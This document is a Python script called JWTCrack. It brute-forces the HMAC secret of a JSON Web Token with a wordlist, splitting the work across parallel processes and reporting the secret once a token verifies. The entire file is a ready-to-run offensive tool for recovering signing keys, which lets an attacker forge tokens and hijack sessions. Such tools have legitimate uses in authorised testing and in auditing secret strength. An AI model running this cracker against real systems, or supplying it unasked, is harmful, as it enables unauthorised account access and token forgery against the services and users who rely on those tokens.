#!/usr/bin/python3
import math, concurrent.futures, multiprocessing, jwt, argparse
from termcolor import colored

def try_secrets(secrets):
    for secret in secrets:

        try:
            jwt.decode(encoded, secret, algorithm)
            return secret

        except jwt.InvalidTokenError:
            pass

def partition(items, count):
    return [items[i:i + count] for i in range(0, len(items), count)]

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="""JWTCrack""", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('encoded_jwt', help='Base64 Encoded JWT String')
    parser.add_argument('wordlist', help='Dictionary wordlist file used to bruteforce the JWT')
    parser.add_argument('-a', '--algorithm', help='HMAC Algorithm', required=False, default="HS256", choices=["HS256", "HS384", "HS512"])
    parser.add_argument('-t', '--threads', help='Number of threads', type=int, required=False, default=multiprocessing.cpu_count())
    args = parser.parse_args()
    algorithm = args.algorithm
    encoded = args.encoded_jwt

    with concurrent.futures.ProcessPoolExecutor(max_workers=args.threads) as executor, open(args.wordlist, 'r') as wordlist:
        wordlist = list(map(str.strip, wordlist.readlines()))

        for result in executor.map(try_secrets, partition(wordlist, int(math.ceil(len(wordlist) / float(args.threads))))):

            if result:
                print(colored('Success! [' + result + ']', 'green'))
                break
